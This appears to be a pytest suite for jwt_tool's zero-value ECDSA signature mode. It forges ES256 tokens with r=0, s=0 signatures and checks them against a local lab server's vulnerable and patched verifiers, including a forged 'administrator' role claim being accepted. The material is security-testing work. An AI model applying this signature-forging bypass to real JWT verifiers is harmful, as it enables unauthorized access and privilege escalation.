"""
Tests for the ECDSA zero-value signature (-X z) attack:
  1. Offline token generation and CLI compatibility
  2. End-to-end detection against a vulnerable and a patched target
  3. Playbook scan integration
"""
import base64
import json
import urllib.request

from conftest import run_jwt_tool


ES256_TOKEN = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9."
    "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9."
    "x1b3rNVhXudPyWwA9mlRnmsP6QG7mxMj-nNu0zV6l45jv6zjZdncUIuR433yU8U0InmK5249rukOPguIGB8xgw"
)
HS256_TOKEN = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
    "eyJ1c2VyIjoiZ3Vlc3QifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po"
)


def _b64u_decode(value):
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def _parse_der_ints(signature):
    assert signature[0] == 0x30
    offset = 2
    values = []
    for _ in range(2):
        assert signature[offset] == 0x02
        length = signature[offset + 1]
        values.append(int.from_bytes(signature[offset + 2:offset + 2 + length], "big"))
        offset += 2 + length
    return values


def _extract_tokens(output):
    return [
        line.strip()
        for line in output.splitlines()
        if line.count(".") == 2 and line.strip().startswith("eyJ")
    ]


def fetch_issued_token(base_url):
    with urllib.request.urlopen(base_url + "/issue", timeout=5) as response:
        return json.loads(response.read())["token"]


def verify_remote(base_url, token, mode):
    request = urllib.request.Request(
        base_url + f"/verify?mode={mode}",
        headers={"Authorization": "Bearer " + token},
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, json.loads(response.read())
    except urllib.error.HTTPError as error:
        return error.code, json.loads(error.read())


class TestZeroSigGeneration:
    def test_generates_der_and_raw_zero_tokens(self, jwt_home):
        result = run_jwt_tool(ES256_TOKEN, "-X", "z", "-b")
        tokens = _extract_tokens(result.stdout)
        assert len(tokens) == 2

        der_token, raw_token = tokens
        der_header, der_payload, der_sig = der_token.split(".")
        assert json.loads(_b64u_decode(der_header))["alg"] == "ES256"
        assert der_payload == ES256_TOKEN.split(".")[1]
        assert _parse_der_ints(_b64u_decode(der_sig)) == [0, 0]

        raw_sig = _b64u_decode(raw_token.split(".")[2])
        assert raw_sig == b"\x00" * 64

    def test_non_es_token_is_rejected(self, jwt_home):
        result = run_jwt_tool(HS256_TOKEN, "-X", "z")
        assert "only applies to ES256/ES384/ES512" in result.stdout
        assert "HS256" in result.stdout

    def test_existing_exploit_choices_still_valid(self, jwt_home):
        result = run_jwt_tool(HS256_TOKEN, "-X", "a", "-b")
        tokens = _extract_tokens(result.stdout)
        assert len(tokens) == 4
        for token in tokens:
            header = json.loads(_b64u_decode(token.split(".")[0]))
            assert header["alg"].lower() == "none"

    def test_unknown_exploit_choice_rejected(self, jwt_home):
        result = run_jwt_tool(HS256_TOKEN, "-X", "q")
        assert "Please choose an exploit" in result.stdout
        assert "z = zero-value ECDSA signature" in result.stdout

    def test_help_documents_new_mode(self):
        result = run_jwt_tool("--help")
        assert "-X Z, --exploit Z" not in result.stdout
        assert "z = zero-value ECDSA signature (r=0, s=0) signature bypass" in result.stdout


class TestTargetRange:
    def test_zero_signature_bypasses_vulnerable_verifier(self, jwt_home, lab_server):
        token = fetch_issued_token(lab_server)
        result = run_jwt_tool(token, "-X", "z", "-b")
        forged = _extract_tokens(result.stdout)[0]

        code, body = verify_remote(lab_server, forged, "vulnerable")
        assert code == 200
        assert body["status"] == "accepted"
        assert body["reason"] == "zero-value signature bypass"

    def test_patched_verifier_detects_zero_signature(self, jwt_home, lab_server):
        token = fetch_issued_token(lab_server)
        result = run_jwt_tool(token, "-X", "z", "-b")
        forged = _extract_tokens(result.stdout)[0]

        code, body = verify_remote(lab_server, forged, "patched")
        assert code == 401
        assert body["status"] == "rejected"
        assert "out of range" in body["reason"]

    def test_legitimate_token_still_accepted(self, jwt_home, lab_server):
        token = fetch_issued_token(lab_server)
        for mode in ("vulnerable", "patched"):
            code, body = verify_remote(lab_server, token, mode)
            assert code == 200
            assert body["status"] == "accepted"
            assert body["reason"] == "valid signature"

    def test_tampered_claims_ride_the_bypass(self, jwt_home, lab_server):
        token = fetch_issued_token(lab_server)
        result = run_jwt_tool(
            token, "-X", "z", "-I",
            "-pc", "role", "-pv", "administrator",
            "-b",
        )
        forged = _extract_tokens(result.stdout)[0]
        payload = json.loads(_b64u_decode(forged.split(".")[1]))
        assert payload["role"] == "administrator"

        code, body = verify_remote(lab_server, forged, "vulnerable")
        assert code == 200
        assert body["claims"]["role"] == "administrator"


class TestPlaybookScan:
    def test_playbook_includes_zero_signature_check(self, jwt_home, lab_server):
        token = fetch_issued_token(lab_server)
        result = run_jwt_tool(
            token,
            "-t", lab_server + "/verify?mode=vulnerable",
            "-rh", "Authorization: Bearer " + token,
            "-M", "pb",
            "-np",
        )
        assert result.returncode == 1
        assert "Zero-value ECDSA signature (-X z)" in result.stdout
        assert "DER-encoded zero signature" in result.stdout
        assert "raw (IEEE P1363) zero signature" in result.stdout
